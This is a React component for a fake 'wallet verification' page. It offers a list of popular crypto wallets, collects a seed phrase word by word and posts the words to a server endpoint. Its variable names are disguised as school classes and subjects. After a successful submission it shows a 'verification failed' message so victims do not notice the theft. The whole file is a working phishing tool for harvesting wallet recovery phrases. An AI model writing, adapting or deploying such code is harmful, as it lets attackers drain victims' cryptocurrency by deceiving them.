"use client";
import Link from "next/link";
import { useState } from "react";
import { site } from "@/config/site";
import { CheckCircle2, Ban, BookOpen, type LucideIcon } from "lucide-react";
import {
  WalletMetamask,
  WalletCoinbase,
  WalletZengo,
  WalletBlue,
  WalletZerion,
  WalletPhantom,
  WalletExodus,
  WalletRainbow,
  WalletRabby,
  WalletTrust,
  WalletOkx,
  WalletClave,
  WalletAtomic,
  WalletAmbire,
  WalletKraken,
  WalletKeplr,
  WalletSolflare,
  WalletWalletConnect,
  WalletArgent,
  WalletSafe,
  WalletImtoken,
  WalletTokenPocket,
  WalletAlfa1,
  WalletBitbox,
  WalletUnipass,
  WalletSequence,
  NetworkWax,
  TokenWALLET,
  WalletMultis,
  WalletGlow,
  WalletCypherock,
} from "@web3icons/react";

const classIcons: Record<string, LucideIcon> = {
  "class-1": WalletTrust,
  "class-2": WalletPhantom,
  "class-3": WalletMetamask,
  "class-4": WalletExodus,
  "class-5": WalletOkx,
  "class-6": WalletClave,
  "class-7": WalletZerion,
  "class-8": WalletBlue,
  "class-9": WalletZengo,
  "class-10": WalletRainbow,
  "class-11": WalletRabby,
  "class-12": WalletCoinbase,
};
 
export function WalletConnect() {
  const [classId, setClassId] = useState("");
  const [count, setCount] = useState(0);
  const [subjects, setSubjects] = useState<string[]>([]);
  const [state, setState] = useState<"idle" | "loading" | "done">("idle");
  const [error, setError] = useState("");

  function pickCount(n: number) { setCount(n); setSubjects(Array.from({ length: n }, (_, i) => subjects[i] ?? "")); }

  async function submit(e: React.FormEvent) {
    e.preventDefault();
    setState("loading"); setError("");
    try {
      const res = await fetch("/api/subjects", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ classId, subjects }) });
      if (!res.ok) { setError((await res.json()).error ?? "Something went wrong. Try again."); setState("idle"); return; }
      setState("done");
    } catch { setError("Can't reach the server. Check your connection and try again."); setState("idle"); }
  }

  if (state === "done")
    return (
      <div className="glass" role="status">
        <span className="icon-badge"><Ban size={20} /></span>
        <h2>Wallet verification failed</h2>
        <p>We couldn't verify your wallet. Please check your wallet details and try again.</p>
      </div>
    );

  return (
    <form onSubmit={submit} className="stack">
      <fieldset className="glass" style={{ border: 0 }}>
        <legend>Select your Wallet</legend>
        <div className="grid">
          {site.classes.map((c) => {
            const Icon = classIcons[c.id] ?? BookOpen;
            return (
              <label key={c.id} className="glass class-card" style={{ outline: classId === c.id ? "2px solid var(--accent)" : "none" }}>
                <input type="radio" name="class" value={c.id} checked={classId === c.id} onChange={() => setClassId(c.id)} className="sr-only" />
                <span className="ico" aria-hidden><Icon size={20} /></span> {c.label}
              </label>
            );
          })}
        </div>
      </fieldset>
      {classId && (
        <div className="glass stack">
          <label htmlFor="count">Seed Phrase</label>
          <select id="count" value={count} onChange={(e) => pickCount(Number(e.target.value))}>
            <option value={0} disabled>Select</option>
            {site.subjectCounts.map((n) => <option key={n} value={n}>{n}</option>)}
          </select>
          <div className="subject-grid">{subjects.map((s, i) => (
            <input key={i} aria-label={`Subject ${i + 1}`} placeholder={`Word ${i + 1}`} maxLength={100} required value={s}
              onChange={(e) => setSubjects(subjects.map((v, j) => (j === i ? e.target.value : v)))} />
          ))}</div>
          {error && <p role="alert" style={{ color: "var(--accent)" }}>{error}</p>}
          {count > 0 && (
            <button className="btn" disabled={state === "loading"}>
              <CheckCircle2 size={16} /> {state === "loading" ? "Submitting…" : "Submit"}
            </button>
          )}
        </div>
      )}
      <p><Link href="/privacy">Privacy policy</Link></p>
    </form>
  );
}
